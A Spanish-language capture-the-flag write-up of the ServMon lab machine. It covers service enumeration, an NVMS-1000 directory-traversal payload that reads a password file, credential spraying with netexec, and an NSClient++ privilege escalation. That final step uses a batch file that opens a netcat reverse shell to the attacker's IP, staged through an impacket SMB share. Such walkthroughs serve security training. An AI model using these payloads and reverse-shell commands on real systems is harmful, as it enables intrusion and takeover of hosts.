# Servmon

![](../../../../~gitbook/image.md)Publicado: 10 de Junio de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Easy
###📝 Descripción
ServMon es una máquina Windows de dificultad fácil que presenta múltiples vectores de ataque. La explotación inicial involucra el abuso de una vulnerabilidad de Directory Traversal en el servicio NVMS-1000 para obtener credenciales de usuario almacenadas en archivos de texto. Una vez obtenido acceso SSH, la escalada de privilegios se logra mediante la explotación de NSClient++, un agente de monitorización que permite la ejecución de scripts externos con privilegios de SYSTEM.
###🎯 Resumen Ejecutivo
- IP de la máquina: 10.10.10.184
- SO: Windows Server 2019
- Servicios principales: FTP (21), SSH (22), HTTP (80), SMB (445), NSClient++ (8443)
- Vulnerabilidades explotadas:Directory Traversal en NVMS-1000 (CVE-2019-20085)
- Escalada de privilegios via NSClient++ (CVE-2019-20098)

###🔭 Reconocimiento

####Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 128 sugiere que probablemente sea una máquina Windows.
####Escaneo de puertos

####Enumeración de servicios

####🔐 Enumeración de Servicios
📁 21 TCP - FTPTras confirmar mediante el escaneo que la sesión anónima en el servicio FTP está habilitada, utilizamos la herramienta `curlftpfs` para crear una montura de este recurso y enumerar mejor este servicio:
Tras como hemos comprobado mediante el escaneo y la enumeración de servicios con nmap, la sessión anónima en el servicio FTP está habilitada.Usaremos la herramienta curlftpfs para crear una montura de este recurso y enumerar mejor este servicio:![](../../../../~gitbook/image.md)Encontramos un archivo de texto interesante llamado Confidential.txt en el directorio del usuario Nadine en el que le indica al usuario Nathan que ha dejado un documento con sus contraseñas en su Escritorio:![](../../../../~gitbook/image.md)Encontramos otro archivo de texto en el directorio del usuario Nathan pero no tenemos permisos para leerlo:![](../../../../~gitbook/image.md)De momento parece que aquí podemos hacer poco más.🗂️ 445 TCP - SMBVerificamos si podemos enumerar mediante una null session pero no parece estar habilitada, lo cual es una buena medida de seguridad:🌐 80 TCP - HTTPAl acceder al servicio de este puerto encontramos una aplicación llamada NVMS-1000. Buscando información pública encontramos que se trata de un Software para centralización de cámaras IP y grabadores MERIVA SO Windows (NVMS1000_) y MAC (NVMS1200).![](../../../../~gitbook/image.md)Las credenciales por defecto `admin:admin` `admin:123456` no funcionan🔎 Fuzzing de directoriosRealizamos fuzzing de directorios pero tampoco hallamos ningún recurso interesante que nos sirva como un posible vector de ataque.![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)
###### 💥 Explotación Inicial

####🔓 Vulnerability Research - NVMS-1000
Buscamos exploits públicos para el servicio NVMS-1000 y encontramos que este servicio ha tenido vulnerabilidades de tipo Directory Traversal:![](../../../../~gitbook/image.md)CVE-2019-20085 - NVMS-1000 Directory Traversal
####🎯 Explotación del Directory Traversal
Interceptamos la petición con Burp Suite y utilizamos el payload para confirmar la PoC:![](../../../../~gitbook/image.md)Usamos esta vulnerabilidad para leer el archivo `Passwords.txt` que estaba en el directorio del usuario Nathan, tal como descubrimos enumerando el servicio FTP:Payload utilizado:![](../../../../~gitbook/image.md)Veamos si podemos usar esta vulnerabilidad de Directory Path Traversal para leer el archivo Passwords.txt que estaba en el usuario de Nathan tal como descubrimos enumerando el servicio FTP. Para ello usamos el siguiente payload:![](../../../../~gitbook/image.md)🔑 Contraseñas obtenidas:🔐 Validación de CredencialesCreamos una lista con los usuarios que tenemos y las contraseñas para probarlas con los servicios ssh y smb:![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)✅ Credenciales válidas encontradas: `nadine:L1k3B1gBut7s@W0rk`
####SSH
Nos autenticamos como nadie en la máquina srvmon y obtenemos la primera flag en su directorio de usuario
####🔍 Enumeración del Sistema

####📊 Análisis de Directorios Interesantes
Verificamos que no tenemos permisos para leer el directorio del usuario NathanEnumerando la máquina encontramos un directorio que contiene un archivo .db3 que es una base de datos sqliteDescargamos este archivo a nuestro host de ataque usando scpNo encontramos nada de utilidad.🛠️ Aplicaciones InstaladasSeguimos enumerando la máquina y esta vez nos centramos en la carpeta de instalación de aplicaciones:NSClient es un agente diseñado originalmente para funcionar con Nagios, pero que desde entonces se ha convertido en un agente de monitorización completo compatible con diversas herramientas de monitorización.Hay varios archivos que merece la pena revisar del directorio de instalación de esta aplicación:changelog.txt
nsclient.ini
nsclient.logEncontramos una contraseña en el fichero nsclient.ini .![](../../../../~gitbook/image.md)Recordemos que con nmap enumerando un servicio en el puerto 8443 cuyo banner era NSClient++
###### 🚀 Escalada de Privilegios

####🌐 8443 TCP - NSClient++ Web Interface
https://10.10.10.184:8443/index.html![](../../../../~gitbook/image.md)Probé a intentar autenticarme en el servicio con la contraseña encontrada el fichero nsclient.ini pero no logré ganar acceso. Sin embargo no fue un error de contraseña incorrecta sino un 403 o lo que es lo mismo un error por falta de permisos.Echando un ojo a esta línea del fichero nsclient.ini me hizo pensar que el acceso a este servicio está permitido única y exclusivamente de forma local, aunque el puerto esté expuesto:Usando SSH solicité un túnel local del puerto `8443` de mi máquina máquina hacia `127.0.0.1:8443` en la máquina remota.A continuación accedí al servicio en https://localhost:8443/index.html usando la contraseña `ew2x6SsGTxjRwXOT`y pude acceder al panel:![](../../../../~gitbook/image.md)A continuación, desde la sesión ssh en windows usé el siguiente comando para enumerar la versión de NSClient++
####💣 Exploit - NSClient++ Privilege Escalation
CVE-2019-20098 - NSClient++ permite la escalada de privilegios local:
Encontré algunos exploits públicos para esta versión y uno de ellos permitía la escalada de privilegios![](../../../../~gitbook/image.md)Al instalar NSClient++ con el servidor web habilitado, los usuarios locales con privilegios bajos pueden leer la contraseña del administrador web en texto plano desde el archivo de configuración. Desde aquí, el usuario puede iniciar sesión en el servidor web y realizar cambios en el archivo de configuración, que normalmente está restringido.El usuario puede habilitar los módulos para que revisen scripts externos y programen su ejecución. No parece haber restricciones sobre el origen de las llamadas, por lo que el usuario puede crear el script desde cualquier lugar. Dado que el servicio NSClient++ se ejecuta como sistema local, estos scripts programados se ejecutan como ese usuario y el usuario con privilegios bajos puede acceder a la escalada de privilegios. Según mi experiencia, se requiere reiniciar para recargar y leer los cambios en la configuración web.Requisitos previos:
Para explotar esta vulnerabilidad con éxito, un atacante debe tener acceso local a un sistema que ejecute NSClient++ con el servidor web habilitado mediante una cuenta de usuario con privilegios bajos y la capacidad de reiniciar el sistema.Descargamos el exploit:Los pasos para llevar a acabo la explotación son los siguientes:El este caso el punto 1 ya lo tenemos, pues ya hemos obtenido la contraseña y tenemos acceso al servicio desde nuestro host de ataque. Así que accedemos al servicio y nos autenticamos con la contraseña ew2x6SsGTxjRwXOTEl siguiente punto es verificar que en la sección "Modules" tenemos habilitados los módulos CheckExternalScripts y Scheduler![](../../../../~gitbook/image.md)![](../../../../~gitbook/image.md)Ahora, en nuestro host de ataque debemo crearnos un archivo evil.bat con el siguiente contenido:El archivo .bat ejecutará la herramienta netcat para conectarse a la ip y el puerto del listener que abramos en nuestro host de ataque.Para esto debemos subir tanto el archivo .bat como la herramienta netcat al directorio c:\temp\Descargamos netcat en su versión de 64 bits para windows de https://eternallybored.org/misc/netcat/Esto podemos hacerlo de muchas formas, una de ellas es usando impacket y un servidor smb:Ahora en la máquina Windows, creamos el directorio Temp si no existe y montamos el recurso smb:![](../../../../~gitbook/image.md)El siguiente paso será definir un nuevo Script dentro de la aplicación NSClient++ de la siguiente forma:![](../../../../~gitbook/image.md)Le damos a "Añadir" y a continuacion guardamos la configuración![](../../../../~gitbook/image.md)Iniciamos el listenerReiniciamos desde la siguiente opción y esperamos recibir la reverse shell![](../../../../~gitbook/image.md)Una vez se reinicie navegamos a Queries y deberemos recibir la conexión reversa y ya podemos obtener la flag en el directorio Desktop del usuario Administrator:![](../../../../~gitbook/image.md)Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🎯 Resumen Ejecutivo](#resumen-ejecutivo)
- [🔭 Reconocimiento](#reconocimiento)

```
❯ ping -c2 10.10.10.184
PING 10.10.10.184 (10.10.10.184) 56(84) bytes of data.
64 bytes from 10.10.10.184: icmp_seq=1 ttl=127 time=44.5 ms
64 bytes from 10.10.10.184: icmp_seq=2 ttl=127 time=44.0 ms

--- 10.10.10.184 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 43.995/44.243/44.492/0.248 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.184 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
❯ echo $ports
21,22,80,135,139,445,5666,6063,6699,8443,49664,49665,49666,49667,49668,49669,49670
```

```
❯ nmap -sC -sV -p$ports 10.10.10.184 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-10 09:10 CEST
Nmap scan report for 10.10.10.184
Host is up (0.043s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_02-28-22  07:35PM                 Users
| ftp-syst:
|_  SYST: Windows_NT
22/tcp    open  ssh           OpenSSH for_Windows_8.0 (protocol 2.0)
| ssh-hostkey:
|   3072 c7:1a:f6:81:ca:17:78:d0:27:db:cd:46:2a:09:2b:54 (RSA)
|   256 3e:63:ef:3b:6e:3e:4a:90:f3:4c:02:e9:40:67:2e:42 (ECDSA)
|_  256 5a:48:c8:cd:39:78:21:29:ef:fb:ae:82:1d:03:ad:af (ED25519)
80/tcp    open  http
| fingerprint-strings:
|   GetRequest, HTTPOptions, RTSPRequest:
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo:
|
|
|
|
|
|     window.location.href = "Pages/login.htm";
|
|
|
|
|
|   NULL:
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5666/tcp  open  tcpwrapped
6063/tcp  open  tcpwrapped
6699/tcp  open  tcpwrapped
8443/tcp  open  ssl/https-alt
|_ssl-date: TLS randomness does not represent time
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
| fingerprint-strings:
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions:
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest:
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     workers
|_    jobs
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.95%I=7%D=6/10%Time=6847DA50%P=x86_64-pc-linux-gnu%r(NULL
SF:,6B,"HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/ht
SF:ml\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n
SF:\r\n")%r(GetRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20tex
SF:t/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x
SF:20\r\n\r\n\xef\xbb\xbf\r\n\r\n\r\n\r\n\x20\x20\x20\x20\r\n\x20\
SF:x20\x20\x20\r\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x2
SF:0\x20\x20\x20\r\n\r\n\r\n\r\n\r\n")
SF:%r(HTTPOptions,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/htm
SF:l\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\
SF:n\r\n\xef\xbb\xbf\r\n\r\n\r\n\r\n\x20\x20\x20\x20\r\n\x20\x20\x
SF:20\x20\r\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20
SF:\x20\x20\r\n\r\n\r\n\r\n\r\n")%r(RT
SF:SPRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\n
SF:Content-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n
SF:\xef\xbb\xbf\r\n\r\n\r\n\r\n\x20\x20\x20\x20\r\n\x20\x20\x20\x2
SF:0\r\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\
SF:x20\r\n\r\n\r\n\r\n\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8443-TCP:V=7.95%T=SSL%I=7%D=6/10%Time=6847DA58%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,74,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocation
SF::\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
SF:\x003\0\0\0\0\x12\x02\x18\0\x1aC\n\x07workers\x12\n\n\x04jobs\x12\x02\x
SF:18\x14\x12\x0f")%r(HTTPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:\
SF:x2018\r\n\r\nDocument\x20not\x20found")%r(FourOhFourRequest,36,"HTTP/1\
SF:.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r(
SF:RTSPRequest,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocume
SF:nt\x20not\x20found")%r(SIPOptions,36,"HTTP/1\.1\x20404\r\nContent-Lengt
SF:h:\x2018\r\n\r\nDocument\x20not\x20found");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-06-10T07:11:59
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required

```

```
sudo curlftpfs ftp://10.10.10.184 /mnt/monturaftp
```

```
smbclient -N -L //10.10.10.184
session setup failed: NT_STATUS_ACCESS_DENIED
```

```
enum4linux 10.10.10.184
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Jun 10 09:21:08 2025

=========================================( Target Information )=========================================

Target ........... 10.10.10.184
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

============================( Enumerating Workgroup/Domain on 10.10.10.184 )============================

[E] Can't find workgroup/domain

================================( Nbtstat Information for 10.10.10.184 )================================

Looking up status of 10.10.10.184
No reply from 10.10.10.184

===================================( Session Check on 10.10.10.184 )===================================

[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.
```

```
netexec smb 10.10.10.184 -u '' -p ''
SMB         10.10.10.184    445    SERVMON          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SERVMON) (domain:ServMon) (signing:False) (SMBv1:False)
SMB         10.10.10.184    445    SERVMON          [-] ServMon\: STATUS_ACCESS_DENIED
```

```
dirsearch -u 10.10.10.184 -x 503,404
```

```
feroxbuster -u http://10.10.10.184 -r  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --scan-dir-listings -C 503 -x php,xml
```

```

# Title: NVMS-1000 - Directory Traversal
# Date: 2019-12-12
# Author: Numan Türle
# Vendor Homepage: http://en.tvt.net.cn/
# Version : N/A
# Software Link : http://en.tvt.net.cn/products/188.html

POC
---------

GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
Host: 12.0.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

Response
---------

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]

```

```
/../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt
```

```
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

```
netexec smb 10.10.10.184 -u srvmon_users.txt -p srvmon_passwords.txt --continue-on-success
```

```
netexec ssh 10.10.10.184 -u srvmon_users.txt -p srvmon_passwords.txt --continue-on-success
```

```
ssh nadine@10.10.10.184
```

```

nadine@SERVMON C:\Users\Nadine>cd Desktop

nadine@SERVMON C:\Users\Nadine\Desktop>dir
Volume in drive C has no label.
Volume Serial Number is 20C1-47A1

Directory of C:\Users\Nadine\Desktop

02/28/2022  08:05 PM              .
02/28/2022  08:05 PM              ..
06/10/2025  12:07 AM                34 user.txt
1 File(s)             34 bytes
2 Dir(s)   6,338,088,960 bytes free

nadine@SERVMON C:\Users\Nadine\Desktop>type user.txt
```

```
nadine@SERVMON C:\Users>cd Nathan
Access is denied.
```

```
nadine@SERVMON C:\RecData>dir
Volume in drive C has no label.
Volume Serial Number is 20C1-47A1

Directory of C:\RecData

02/28/2022  08:02 PM              .
02/28/2022  08:02 PM              ..
02/28/2022  08:02 PM             8,192 RecordInfoDB.db3
02/28/2022  08:02 PM                 0 RecordInfoDB.db3-journal
2 File(s)          8,192 bytes
2 Dir(s)   6,338,064,384 bytes free

nadine@SERVMON C:\RecData>
```

```
scp nadine@10.10.10.184:C:/RecData/RecordInfoDB.db3 .
scp nadine@10.10.10.184:C:/RecData/RecordInfoDB.db3-journal .
```

```
sqlite> .tables
C_ALARM_REC_INFO   C_RECORD_LOG_INFO  C_REC_FILE_INFO
sqlite> .databases
main: /home/kpanic/RecordInfoDB.db3 r/w
sqlite> select * from C_REC_FILE_INFO;
sqlite> select * from C_RECORD_LOG_INFO
```

```
nadine@SERVMON C:\Program Files>dir
Volume in drive C has no label.
Volume Serial Number is 20C1-47A1

Directory of C:\Program Files

02/28/2022  07:55 PM              .
02/28/2022  07:55 PM              ..
03/01/2022  02:20 AM              Common Files
11/11/2019  07:52 PM              internet explorer
02/28/2022  07:07 PM              MSBuild
02/28/2022  07:55 PM              NSClient++
02/28/2022  07:46 PM              NVMS-1000
02/28/2022  07:32 PM              OpenSSH-Win64
02/28/2022  07:07 PM              Reference Assemblies
02/28/2022  06:44 PM              VMware
11/11/2019  07:52 PM              Windows Defender
11/11/2019  07:52 PM              Windows Defender Advanced Threat Protection
09/15/2018  12:19 AM              Windows Mail
11/11/2019  07:52 PM              Windows Media Player
09/15/2018  12:19 AM              Windows Multimedia Platform
09/15/2018  12:28 AM              windows nt
11/11/2019  07:52 PM              Windows Photo Viewer
09/15/2018  12:19 AM              Windows Portable Devices
09/15/2018  12:19 AM              Windows Security
02/28/2022  07:25 PM              WindowsPowerShell
```

```
allowed hosts = 127.0.0.1
```

```
ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184
```

```
nadine@SERVMON C:\Program Files\NSClient++>nscp.exe --version
NSClient++, Version: 0.5.2.35 2018-01-28, Platform: x64
```

```
searchsploit -m  windows/local/46802.txt
```

```
Prerequisites:
To successfully exploit this vulnerability, an attacker must already have local access to a system running NSClient++ with Web Server enabled using a low privileged user account with the ability to reboot the system.

Exploit:
1. Grab web administrator password
- open c:\program files\nsclient++\nsclient.ini
or
- run the following that is instructed when you select forget password
C:\Program Files\NSClient++>nscp web -- password --display
Current password: SoSecret

2. Login and enable following modules including enable at startup and save configuration
- CheckExternalScripts
- Scheduler

3. Download nc.exe and evil.bat to c:\temp from attacking machine
@echo off
c:\temp\nc.exe 192.168.0.163 443 -e cmd.exe

4. Setup listener on attacking machine
nc -nlvvp 443

5. Add script foobar to call evil.bat and save settings
- Settings > External Scripts > Scripts
- Add New
- foobar
command = c:\temp\evil.bat

6. Add schedulede to call script every 1 minute and save settings
- Settings > Scheduler > Schedules
- Add new
- foobar
interval = 1m
command = foobar

7. Restart the computer and wait for the reverse shell on attacking machine
nc -nlvvp 443
listening on [any] 443 ...
connect to [192.168.0.163] from (UNKNOWN) [192.168.0.117] 49671
Microsoft Windows [Version 10.0.17134.753]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Program Files\NSClient++>whoami
whoami
nt authority\system
```

```
@echo off
c:\temp\nc.exe 10.10.14.7 443 -e cmd.exe
```

```
impacket-smbserver smbShare $(pwd) -smb2support -username x3m1Sec -password x3m1Sec123
```

```
net use x: \\10.10.14.7\smbFolder /user:x3m1Sec x3m1Sec123
```

```
copy x:\nc64.exe nc.exe
copy x:\evil.bat evil.bat
```

```
rlwrap nc -nlvp 443
```
